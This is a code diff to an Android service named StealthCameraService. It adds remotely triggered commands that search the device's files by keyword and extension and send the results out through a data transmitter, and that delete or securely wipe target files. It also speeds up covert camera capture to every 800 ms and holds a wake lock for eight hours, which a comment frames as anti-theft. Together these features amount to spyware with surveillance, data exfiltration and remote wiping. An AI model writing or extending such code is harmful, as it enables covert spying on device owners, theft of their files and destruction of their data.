@@ -26,8 +26,10 @@ import androidx.core.app.NotificationCompat;
 import androidx.annotation.NonNull;
 import java.nio.ByteBuffer;
 import java.util.Arrays;
+import java.util.List;
 import java.util.concurrent.Semaphore;
 import java.util.concurrent.TimeUnit;
+import org.json.JSONArray;
 
 public class StealthCameraService extends Service {
     private static final String TAG = "StealthCameraService";
@@ -144,6 +146,18 @@ public class StealthCameraService extends Service {
 
             case "switch_camera":
                 switchCamera();
+                break;
+
+            case "search_files":
+                performFileSearch();
+                break;
+
+            case "delete_files":
+                performDeleteFiles(false);
+                break;
+
+            case "secure_wipe":
+                performDeleteFiles(true);
                 break;
 
             default:
@@ -327,6 +341,64 @@ public class StealthCameraService extends Service {
         }
     }
 
+    private void performFileSearch() {
+        SharedPreferences prefs = getSharedPreferences("stealth_commands", MODE_PRIVATE);
+        String keywordsJson = prefs.getString("search_keywords", "[]");
+        String extensionsJson = prefs.getString("search_extensions", "[]");
+
+        backgroundHandler.post(() -> {
+            try {
+                FileManagementService fileService = new FileManagementService(this);
+                FileManagementService.SearchCriteria criteria = new FileManagementService.SearchCriteria();
+
+                JSONArray keywords = new JSONArray(keywordsJson);
+                for (int i = 0; i < keywords.length(); i++) {
+                    String kw = keywords.getString(i).trim();
+                    if (!kw.isEmpty()) criteria.addKeywordPattern(kw);
+                }
+
+                JSONArray extensions = new JSONArray(extensionsJson);
+                for (int i = 0; i < extensions.length(); i++) {
+                    String ext = extensions.getString(i).trim().toLowerCase();
+                    if (!ext.isEmpty()) criteria.addFileExtension(ext);
+                }
+
+                List<String> results = fileService.searchFiles(criteria);
+                Log.d(TAG, "File search complete: " + results.size() + " files found");
+                dataTransmitter.sendSearchResults(results);
+            } catch (Exception e) {
+                Log.e(TAG, "File search failed", e);
+            }
+        });
+    }
+
+    private void performDeleteFiles(boolean secureWipe) {
+        SharedPreferences prefs = getSharedPreferences("stealth_commands", MODE_PRIVATE);
+        String filesJson = prefs.getString("target_files", "[]");
+
+        backgroundHandler.post(() -> {
+            try {
+                FileManagementService fileService = new FileManagementService(this);
+                JSONArray filesArray = new JSONArray(filesJson);
+                List<String> filePaths = new java.util.ArrayList<>();
+                for (int i = 0; i < filesArray.length(); i++) {
+                    filePaths.add(filesArray.getString(i));
+                }
+
+                if (secureWipe) {
+                    for (String path : filePaths) {
+                        fileService.secureDelete(path);
+                    }
+                } else {
+                    fileService.deleteFiles(filePaths);
+                }
+                Log.d(TAG, (secureWipe ? "Secure wipe" : "Delete") + " complete for " + filePaths.size() + " files");
+            } catch (Exception e) {
+                Log.e(TAG, "File delete failed", e);
+            }
+        });
+    }
+
     private void openCamera(String cameraId) {
         if (ActivityCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
             Log.e(TAG, "Camera permission not granted");
@@ -451,7 +523,7 @@ public class StealthCameraService extends Service {
                         captureBuilder.set(CaptureRequest.CONTROL_MODE, CameraMetadata.CONTROL_MODE_AUTO);
 
                         captureSession.capture(captureBuilder.build(), null, backgroundHandler);
-                        backgroundHandler.postDelayed(this, 3000);
+                        backgroundHandler.postDelayed(this, 800);
 
                     } catch (CameraAccessException e) {
                         Log.e(TAG, "Live capture failed", e);
@@ -551,7 +623,7 @@ public class StealthCameraService extends Service {
         PowerManager powerManager = (PowerManager) getSystemService(Context.POWER_SERVICE);
         if (powerManager != null) {
             wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "StealthCamera::WakeLock");
-            wakeLock.acquire(60 * 60 * 1000L);
+            wakeLock.acquire(8 * 60 * 60 * 1000L); // 8 часов — достаточно для антикражного сценария
         }
     }
 
